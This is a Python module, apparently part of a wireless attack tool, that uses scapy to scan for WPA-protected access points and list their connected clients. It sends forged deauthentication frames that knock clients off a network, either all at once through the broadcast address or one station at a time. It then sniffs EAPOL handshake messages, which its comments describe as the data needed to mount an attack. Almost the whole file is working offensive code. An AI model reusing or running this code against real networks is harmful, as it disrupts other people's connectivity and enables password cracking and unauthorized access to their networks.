from style import *
from nic import NetworkInterface
from scapy.all import RadioTap, Dot11, Dot11Elt, Dot11Deauth, Dot11Beacon, EAPOL


class AccessPoint(object):
    def __init__(self, beacon, bssid: str, channel: int, essid: str, dbm_sig: int):
        # Connected client stations
        self.stations  = []

        self.beacon = beacon

        self.bssid = bssid
        self.essid = essid

        self.channel = channel
        self.dbm_sig = dbm_sig

    # Colored string representation
    def __str__(self):
        s = f'{self.dbm_sig}{color_none}'
        s = f'{color_cyan if (self.dbm_sig >= -75) else color_red}{s:3}'

        c = f'{color_cyan}{self.channel:2}{color_none}'

        return f'│ {self.bssid} │ Channel {c} │ {s} dBm │ {self.essid}'

    # Scan the network for connected stations
    def scan(self, iface: NetworkInterface):
        # Empty the current list
        self.stations = []

        def callback(pkt):
            # Ignore known stations
            ign = [s.hwaddr for s in self.stations] + ['ff:ff:ff:ff:ff:ff']

            if pkt[Dot11].addr1 == pkt[Dot11].addr3:
                sta_hwaddr = pkt[Dot11].addr2.lower()
            else:
                sta_hwaddr = pkt[Dot11].addr1.lower()

            if sta_hwaddr in ign:
                return

            self.stations.append(Station(self, sta_hwaddr, pkt.dBm_AntSignal))

        if iface.channel != self.channel:
            iface.set_channel(self.channel)

        # Inspect all packets in which the access point is source or destination
        iface.recv(
            timeout = 10, prn = callback,
            filter = f'ether src {self.bssid} or ether dst {self.bssid}'
        )

    # Deauthenticate the broadcast
    def deauth(self, iface: NetworkInterface, count = 1):
        d11 = RadioTap() / Dot11(
                addr1 = 'ff:ff:ff:ff:ff:ff',
                addr2 = self.bssid, addr3 = self.bssid
        )

        pkt = d11 / Dot11Deauth(reason = 3)

        iface.set_channel(self.channel)
        iface.send(pkt, verbose = False, inter = 0.75, count = count)

    # Sniff for EAPOL key frames (ideally messages 1 and 2 [currently, there  is
    # a bug in which messages 1 and 4 can also be accepted as sufficient data to
    # mount an attack, as the only check regarding message order  utilizes  only
    # the source and destination fields in the Dot11 frame])
    def sniff_handshake(self, iface: NetworkInterface):
        def callback(pkt):
            if not (pkt.haslayer(EAPOL) and pkt[EAPOL].type == 3):
                return

            if pkt[Dot11].addr3 != self.bssid:
                return

            if pkt[Dot11].addr1 == self.bssid:
                station_hwaddr = pkt[Dot11].addr2
            else:
                station_hwaddr = pkt[Dot11].addr1

            if not station_hwaddr in [s.hwaddr for s in self.stations]:
                self.stations.append(
                    Station(self, station_hwaddr, pkt.dBm_AntSignal)
                )

            station = {s.hwaddr:s for s in self.stations}.get(station_hwaddr)
            index = len(station.handshake)

            if (index == 0 and pkt[Dot11].addr1 == station.hwaddr) or \
               (index == 1 and pkt[Dot11].addr2 == station.hwaddr):
                station.handshake.append(pkt)

        iface.recv(
            timeout = 10, prn = callback,
            filter = 'ether proto 0x888e',
            stop_filter = lambda pkt: self.get_handshake()
        )

        if not self.get_handshake():
            for s in self.stations:
                s.handshake = []

    # Return the first handshake list from the client stations which contain the
    # necessary messages to mount an attack
    def get_handshake(self):
        return next(
            (s.handshake for s in self.stations if len(s.handshake) == 2), None
        )


class Station(object):
    def __init__(self, ap: AccessPoint, hwaddr: str, dbm_sig: int):
        self.ap = ap
        self.hwaddr = hwaddr
        self.dbm_sig = dbm_sig

        # Handshake information
        self.handshake = []


    def __str__(self):
        s = f'{self.dbm_sig}{color_none}'
        s = f'{color_cyan if (self.dbm_sig >= -75) else color_red}{s:3}'

        return f'│ {self.hwaddr} │ {s} dBm'

    # Deauthenticate this station
    def deauth(self, iface: NetworkInterface, count = 1):
        d11 = RadioTap() / Dot11(
                addr1 = self.hwaddr,
                addr2 = self.ap.bssid, addr3 = self.ap.bssid
        )

        pkt = d11 / Dot11Deauth(reason = 3)

        iface.set_channel(self.ap.channel)
        iface.send(pkt, verbose = False, inter = 0.75, count = count)

# Scan networks and return a list of AccessPoint
def scan_aps(iface: NetworkInterface, essids = [], \
             channels = [c for c in range(1, 15)], min_dbm = -90):
    aps = []

    def callback(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return

        try:
            essid = pkt[Dot11Elt].info.decode()
            stats = pkt[Dot11Beacon].network_stats()
        except:
            return

        if not essid:
            return

        if essids and essid not in essids:
            return

        if set(stats.get('crypto')) & {'OPN', 'WEP'}:
            return

        if pkt.dBm_AntSignal < min_dbm:
            return

        if pkt[Dot11].addr2 in [ap.bssid for ap in aps]:
            return

        aps.append(AccessPoint(
            pkt,
            pkt[Dot11].addr2, stats.get('channel'),
            pkt[Dot11Elt].info.decode(), pkt.dBm_AntSignal
        ))

    # Sniff on a list of channels
    for c in channels:
        iface.set_channel(c)

        iface.recv(
            timeout = 0.75, prn = callback,
            filter = 'wlan type mgt subtype beacon',
            stop_filter = lambda pkt: essids and len(aps) == len(essids)
        )

    return aps
